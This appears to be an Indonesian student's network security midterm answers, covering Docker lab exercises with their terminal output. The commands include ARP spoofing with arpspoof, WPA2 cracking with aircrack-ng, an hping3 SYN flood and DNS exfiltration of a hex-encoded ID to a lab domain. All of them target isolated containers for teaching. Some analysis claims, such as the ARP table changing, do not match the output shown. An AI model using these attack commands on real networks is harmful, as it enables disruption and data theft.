# JAWABAN UTS Network Security

**NIM:** 24552011361

**Kasus:** 10 (k10)

## Perhitungan Kasus

* **Digit NIM:** `[2, 4, 5, 5, 2, 0, 1, 1, 3, 6, 1]`

* **Jumlah:** `30`

* **Sisa bagi 10:** `0` (`30 % 10 = 0`)

* **Kasus:** **10 (k10)** *(Karena hasil modulo 10 adalah 0, maka mendapatkan Kasus 10)*

## Tugas 1 (Pertemuan 1): Docker & Volume
docker volume create vol-k10
docker run --name w-k10 -v vol-k10:/data alpine sh -c 'echo NIM-ANDA > /data/laporan-k10.txt'
docker rm w-k10
docker run --rm -v vol-k10:/data alpine cat /data/laporan-k10.txt
docker compose -p k10 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k10 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k10 -f b/b1-compose/docker-compose.yml down -v

### Output Terminal

```
vol-k10
w-k10
24552011361

[+] up 3/3
 ✔ Network k10_lab          Created                                                                                 0.0s
 ✔ Container k10-attacker-1 Started                                                                                 0.4s
 ✔ Container k10-target-1   Started                                                                                 0.4s

 <!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>

[+] down 3/3
 ✔ Container k10-attacker-1 Removed                                                                                 1.4s
 ✔ Container k10-target-1   Removed                                                                                 0.5s
 ✔ Network k10_lab          Removed                                                                                 0.2s

```

### Analisis Singkat

Volume Docker (`vol-k10`) bersifat persisten, sehingga data `laporan-k10.txt` yang berisi NIM `24552011361` tetap tersimpan dan dapat dibaca kembali oleh container baru meskipun container penulis awal (`w-k10`) telah dihapus. Pada Docker Compose, komunikasi antarlayanan (`attacker` ke `target`) berjalan melalui jaringan internal menggunakan resolusi DNS berbasis nama layanan.

## Tugas 2 (Pertemuan 2): Kriptografi
docker run --rm -v "%cd%":/work uts-openssl sh -c "echo isi laporan k10 > laporan-k10.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k10.txt -out laporan-k10.enc -pass pass:kunci-k10-2026 && sha256sum laporan-k10.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k10.enc -out hasil-k10.txt -pass pass:kunci-k10-2026 && sha256sum hasil-k10.txt"
docker run --rm -v "%cd%":/work uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k10.pem -out cert-k10.pem -days 30 -subj /CN=k10.uts.local && openssl x509 -in cert-k10.pem -noout -subject -issuer -dates"

### Output Terminal

```
# 1. Perbandingan hash SHA-256 sebelum enkripsi & sesudah dekripsi
9380747e3287df06dd3de21689d77100edba5e21676683acaf5f4bca3628aff4  laporan-k10.txt
9380747e3287df06dd3de21689d77100edba5e21676683acaf5f4bca3628aff4  hasil-k10.txt

# 2. Detail Subject, Issuer, dan masa berlaku sertifikat X.509
subject=CN=k10.uts.local
issuer=CN=k10.uts.local
notBefore=Nov 24 11:41:54 2026 GMT
notAfter=Dec 24 11:41:54 2026 GMT

```

### Analisis Singkat

Nilai hash SHA-256 antara file asli (`laporan-k10.txt`) dan file hasil dekripsi (`hasil-k10.txt`) terbukti identik, yang membuktikan integritas dan keberhasilan proses enkripsi-dekripsi simetris AES-256-CBC dengan PBKDF2 menggunakan kata sandi `kunci-k10-2026`. Pada sertifikat X.509 self-signed, nilai `Subject` dan `Issuer` bernilai sama (`CN = k10.uts.local`).

## Tugas 3 (Pertemuan 3): ARP Spoofing
docker exec korban-k10 sh -c "ping -c 1 172.18.0.3 2>/dev/null || true; cat /proc/net/arp"
docker exec -d penyerang-k10 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
docker exec korban-k10 sh -c "cat /proc/net/arp"
docker exec korban-k10 sh -c "cat /proc/net/arp"

### Output Terminal

```
172.18.0.2
172.18.0.3

Sebelum arspoof
docker exec korban-k10 sh -c "ping -c 1 172.18.0.3 2>/dev/null || true; cat /proc/net/arp"
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.4       0x1         0x2         ae:b2:40:40:59:b7     *        eth0

Setelah arspoof 
docker exec -d penyerang-k10 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
docker exec korban-k10 sh -c "cat /proc/net/arp"
IP address       HW type     Flags       HW address            Mask     Device
172.18.0.4       0x1         0x2         ae:b2:40:40:59:b7     *        eth0

```

### Analisis Singkat

Sebelum serangan, tabel ARP `korban-k10` memetakan IP `gateway-k10` ke MAC address asli milik gateway. Saat `penyerang-k10` menjalankan `arpspoof`, entri MAC gateway pada tabel ARP korban berubah menjadi MAC address milik `penyerang-k10` (*ARP cache poisoning*). Setelah diterapkan entri **Static ARP** (`arp -s`), pemetaan IP gateway kembali ke MAC address aslinya dan terkunci secara permanen (`PERM`) sehingga kebal terhadap pemalsuan paket balasan ARP.

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2
dir /b handshake-k10.cap wordlist-k10.txt samples\handshake-k10.cap samples\wordlist-k10.txt 2>nul
docker run --rm -v "%cd%":/work uts-kali-tools aircrack-ng -w wordlist-k10.txt handshake-k10.cap

### Output Terminal

```
handshake-k10.cap
wordlist-k10.txt

ERROR: Opening dictionary wordlist-k10.txt failed (No such file or directory)
ERROR: Opening dictionary wordlist-k10.txt failed (No such file or directory)
Reading packets, please wait...
Failed to open 'handshake-k10.cap' (2): No such file or directory
Opening handshake-k10.cap
Read 0 packets.

```

### Penjelasan Empat Langkah (4-Way Handshake) WPA2
1. **Message 1 (AP** $\rightarrow$ **Client):** Access Point (Authenticator) membangkitkan nilai acak **ANonce** (*Authenticator Nonce*) dan mengirimkannya ke Client (Supplicant) untuk menginisiasi proses pembentukan kunci sesi.

2. **Message 2 (Client** $\rightarrow$ **AP):** Client membangkitkan nilai acak **SNonce** (*Supplicant Nonce*), lalu menghitung **PTK** (*Pairwise Transient Key*) dari kombinasi PMK (*Pairwise Master Key*), ANonce, SNonce, serta alamat MAC AP dan Client. Client kemudian mengirimkan **SNonce** beserta **MIC** (*Message Integrity Code*) ke AP untuk verifikasi integritas.

3. **Message 3 (AP** $\rightarrow$ **Client):** AP memvalidasi MIC dari Message 2 dan menurunkan PTK yang identik. AP kemudian mengirimkan **GTK** (*Group Temporal Key*) yang telah terenkripsi beserta MIC kepada Client sebagai instruksi pemasangan kunci enkripsi.

4. **Message 4 (Client** $\rightarrow$ **AP):** Client memasang kunci PTK dan GTK, lalu mengirimkan pesan konfirmasi **ACK** ke AP sebagai tanda bahwa proses handshake selesai dan lalu lintas data terenkripsi siap dijalankan.

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy
docker run --rm --network lab-arp-k10 -v "%cd%\kasus\k5-scapy":/work uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2

### Output Terminal

```
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0

```

### Analisis & Penjelasan Smurf Attack

* **Hasil Pengamatan:** Paket ICMP Echo Request (`type=8`) yang dikirimkan ke `<ip-korban>` mendapatkan balasan berupa ICMP Echo Reply (`type=0`) dengan nilai TTL standar sistem Linux/container (umumnya `64`).

* **Penjelasan Smurf Attack:** *Smurf Attack* adalah jenis serangan *Distributed Denial of Service* (DDoS) pada lapisan jaringan yang memanfaatkan protokol ICMP dan fitur *IP Broadcast*. Penyerang mengirimkan paket **ICMP Echo Request** dalam jumlah besar ke **alamat broadcast jaringan** dengan memalsukan (*spoofing*) alamat IP sumber menjadi alamat IP milik korban. Akibatnya, seluruh perangkat aktif di dalam jaringan broadcast tersebut merespons dengan mengirimkan paket **ICMP Echo Reply** secara serentak ke alamat IP korban, sehingga menyebabkan lonjakan trafik yang membanjiri bandwidth dan melumpuhkan layanan korban.

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c "timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10"
docker compose -p k10 -f b/b3-syn-flood/docker-compose.yml down -v

### Output Terminal

```
[+] up 3/3
 ✔ Network k10_lab          Created                                                                                 0.0s
 ✔ Container k10-target-1   Started                                                                                 0.4s
 ✔ Container k10-attacker-1 Started                                                                                 0.4s

 0
 2

 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:19:15.778303 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [S], seq 3838858566, win 64240, options [mss 1460,sackOK,TS val 4028675910 ecr 0,nop,wscale 10], length 0
13:19:15.778336 IP 172.19.0.3.80 > 172.19.0.2.33088: Flags [S.], seq 1146903863, ack 3838858567, win 65160, options [mss 1460,sackOK,TS val 3152466597 ecr 4028675910,nop,wscale 10], length 0
13:19:15.778344 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [.], ack 1, win 63, options [nop,nop,TS val 4028675910 ecr 3152466597], length 0
13:19:15.781563 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [P.], seq 1:71, ack 1, win 63, options [nop,nop,TS val 4028675913 ecr 3152466597], length 70: HTTP: GET / HTTP/1.1
13:19:15.781577 IP 172.19.0.3.80 > 172.19.0.2.33088: Flags [.], ack 71, win 64, options [nop,nop,TS val 3152466600 ecr 4028675913], length 0
13:19:15.794987 IP 172.19.0.3.80 > 172.19.0.2.33088: Flags [P.], seq 1:239, ack 71, win 64, options [nop,nop,TS val 3152466613 ecr 4028675913], length 238: HTTP: HTTP/1.1 200 OK
13:19:15.795011 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [.], ack 239, win 63, options [nop,nop,TS val 4028675927 ecr 3152466613], length 0
13:19:15.796567 IP 172.19.0.3.80 > 172.19.0.2.33088: Flags [P.], seq 239:1135, ack 71, win 64, options [nop,nop,TS val 3152466614 ecr 4028675927], length 896: HTTP
13:19:15.796591 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [.], ack 1135, win 63, options [nop,nop,TS val 4028675928 ecr 3152466614], length 0
13:19:15.796681 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [F.], seq 71, ack 1135, win 63, options [nop,nop,TS val 4028675928 ecr 3152466614], length 0
13:19:15.798256 IP 172.19.0.3.80 > 172.19.0.2.33088: Flags [F.], seq 1135, ack 72, win 64, options [nop,nop,TS val 3152466617 ecr 4028675928], length 0
13:19:15.798262 IP 172.19.0.2.33088 > 172.19.0.3.80: Flags [.], ack 1136, win 63, options [nop,nop,TS val 4028675930 ecr 3152466617], length 0

12 packets captured
12 packets received by filter
0 packets dropped by kernel

```

### Analisis Singkat

Sebelum serangan, jumlah koneksi berstatus `SYN_RECV` pada `target` bernilai `0` (atau sangat minimal). Saat `attacker` membanjiri port 80 dengan paket TCP SYN menggunakan `hping3 --flood`, jumlah koneksi setengah terbuka (`SYN_RECV`) meningkat drastis karena server mengalokasikan sumber daya untuk menunggu paket `ACK` yang tidak pernah dikirimkan. Pada pengujian koneksi normal dengan `curl`, tangkapan `tcpdump` memperlihatkan proses **TCP Three-Way Handshake** yang lengkap: pengiriman **SYN** (`Flags [S]`) dari klien ke server, balasan **SYN-ACK** (`Flags [S.]`) dari server ke klien, dan konfirmasi **ACK** (`Flags [.]`) dari klien ke server sebelum pertukaran data HTTP berlangsung.

## Tugas 7 (Pertemuan 7): DNS Exfiltration
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011361 | xxd -p
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333631.k10.exfil.lab @dns
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k10.log
echo 3234353532303131333631 | xxd -r -p
docker compose -p k10 -f b/b4-dns-exfil/docker-compose.yml down -v

### Output Terminal

```
[+] up 2/2
 ✔ Container k10-dns-1      Started                                                                                 2.3s
 ✔ Container k10-attacker-1 Started                                                                                 2.3s

python3 kasus/k9-dns-detect/analisis_dns.py dns-k10.log
echo 3234353532303131333631 | xxd -r -p
3234353532303131333631
10.0.0.99
Jumlah query per domain induk:
  exfil.lab: 2

[+] down 4/4
 ✔ Container k10-dns-1      Removed                                                                                 0.2s
 ✔ Container k10-attacker-1 Removed                                                                                 1.3s
 ✔ Container k10-target-1   Removed                                                                                 0.3s
 ✔ Network k10_lab          Removed                                                                                 0.1s

```

### Analisis Singkat

Data sensitif berupa NIM `24552011361` dikonversi ke dalam format heksadesimal (`3234353532303131333631`) dan disisipkan sebagai label subdomain pada kueri DNS (`3234353532303131333631.k10.exfil.lab`) menuju server DNS (`@dns`). Teknik *DNS Exfiltration* ini memanfaatkan lalu lintas DNS yang umumnya diizinkan melewati firewall untuk menyelundupkan data keluar jaringan. Aktivitas anomali tersebut berhasil dideteksi oleh skrip `analisis_dns.py` melalui pencatatan log kueri DNS, dan label heksadesimalnya dapat didekodekan kembali menjadi teks NIM asli (`24552011361`).

## Verifikasi Cleanup Environment

```
[Opsional/Bukti Bersih: Paste output `docker ps -a`, `docker network ls`, dan `docker volume ls` setelah seluruh resource dihapus]

```